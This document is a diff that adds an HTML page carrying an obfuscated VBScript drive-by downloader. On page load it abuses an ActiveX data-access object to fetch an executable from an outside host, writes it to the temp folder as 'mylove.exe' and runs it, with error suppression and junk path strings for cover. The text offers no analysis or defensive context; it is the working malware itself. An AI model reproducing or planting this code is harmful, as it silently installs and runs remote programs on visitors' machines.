@@ -1,0 +1,46 @@
+    <html>
+    <script language="VBScript">
+    on error resume next
+    aspa = "http://rodastudio.cn/program/baidu.exe"
+    Set PHPc = document.createElement("object")
+    PHPc.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
+    seturla="down"
+    seturlb="file"
+    seturlc="copy"
+    seturld="exit"
+    seturle="base"
+    PHPi="Microsoft.XMLHTTP"
+    Set PHPd = PHPc.CreateObject(PHPi,"")
+    seturlf="Ado"
+    seturlg="db."
+    seturlh="Str"
+    seturli="eam"
+    PHPf=seturlf&seturlg&seturlh&seturli
+    PHPg=PHPf
+    set PHPa = PHPc.createobject(PHPg,"")
+    PHPa.type = 1
+    PHPh="GET"
+    PHPd.Open PHPh, aspa, False
+    PHPd.Send
+    PHP9="mylove.exe"
+    set PHPb = PHPc.createobject("Scripting.FileSystemObject","")
+    set PHPe = PHPb.GetSpecialFolder(2)
+    PHPa.open
+    PHP8="PHPa.BuildPath(PHPa,PHP8)"
+    PHP7="PHPb.BuildPath(PHPb,PHP7)"
+    PHP6="PHPc.BuildPath(PHPd,PHP6)"
+    PHP5="PHPd.BuildPath(PHPf,PHP5)"
+    PHP4="PHPe.BuildPath(PHPg,PHP4)"
+    PHP3="PHPf.BuildPath(PHPh,PHP4)"
+    PHP2="PHPg.BuildPath(PHPi,PHP3)"
+    PHP1="PHPh.BuildPath(PHPg,PHP1)"
+    PHP0="PHPi.BuildPath(PHPk,PHP0)"
+    PHP9= PHPb.BuildPath(PHPe,PHP9)
+    PHPa.write PHPd.responseBody
+    PHPa.savetofile PHP9,2
+    PHPa.close
+    set PHPe = PHPc.createobject("Shell.Application","")
+    PHPe.ShellExecute "mylove.exe"
+    </script>
+    </html>
+
